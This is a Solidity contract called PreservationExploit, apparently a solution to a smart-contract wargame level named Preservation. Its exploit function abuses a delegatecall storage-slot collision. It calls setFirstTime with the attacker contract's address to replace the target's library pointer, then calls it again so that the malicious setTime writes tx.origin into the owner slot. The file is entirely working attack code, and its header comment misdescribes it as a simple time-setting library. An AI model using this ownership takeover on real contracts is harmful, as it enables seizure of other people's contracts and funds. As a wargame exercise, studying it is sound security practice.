// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '../Preservation.sol';

// Simple library contract to set the time
contract PreservationExploit {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor() public {
    
  }

  function exploit(address _addr) public {
    Preservation prev = Preservation(_addr);
  
    prev.setFirstTime(uint(address(this)));
    uint _dummyTimeStamp = 1;
    prev.setFirstTime(_dummyTimeStamp);
  }

  function setTime(uint _time) public {
    owner = tx.origin;
  }
}